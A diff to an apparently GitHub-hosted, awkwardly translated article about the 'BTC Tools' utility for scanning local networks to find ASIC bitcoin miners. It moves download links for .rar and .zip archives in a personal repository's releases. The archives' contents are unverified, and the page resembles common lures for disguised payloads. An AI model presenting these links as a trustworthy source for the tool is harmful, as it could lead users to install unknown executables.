@@ -9,9 +9,7 @@ Many people who are professionally mining nowadays do not understand how to find
 
 In general, many have such a problem, after purchasing an ASIC, and given that the problem is not so large-scale, since not a very large number of people are interested in this topic, then find information on finding an ASIC, as well as how to connect to it by IP and the most the main thing is to correctly configure all equipment. Actually, in this article you will get acquainted with a utility called BTC Tools and learn how to download it, install it on your mining equipment, as well as where to download btc tools on your computer to solve such a sensitive problem as finding an ASIC, so that you can then configure it and earn your own money in the maximum amount on bitcoins.
 
-- [ ] [Download BTCTools v1.3.3 for for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/BTCTool_v.1.3.3.rar)
-- [ ] [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
-------------------------------------------------
+- [ ] [Download BTCTools v1.3.3 for for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/btctool110win/BTCTool_v.1.3.3.rar)
 
 ## BTC Tools features, introduces the following features:
 + Scanning miners belonging to several network segments in the local network. Displays basic information about miners such as hash rate, temperature, fan speed, pool, worker name, etc.
@@ -35,7 +33,8 @@ BTCTool
 ## Search for ASICs using Tools.
 Then, to search for ASICs, you should click on the “Scan” button, the field of which will search for ASICs. As the program runs, the progress in the bar next to the button will change. All this time, the program will scan the network, loading it, which is why it is worth turning off all programs and unnecessary devices from this network so as not to load the network and so that the check (scan) is successful.
 ![image](https://user-images.githubusercontent.com/98730417/212393216-861cd3df-6a17-429b-943f-a257ee68eb04.png)
-
+- [ ] [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
+------------------------------------------------
 ## BTC Tools
 In the process of searching for devices, ASICs will be displayed in the list below. In the list you can see the IP, ASIC status, name, operation mode, two ASIC hash rate values that were found during the search. In addition, there is information on the heating temperature of the ASICs, the rotation speed of the fans, the operating time of the ASICs in the active mining mode, as well as the addresses of the pools and walkers to which the ASICs are actually connected.
 
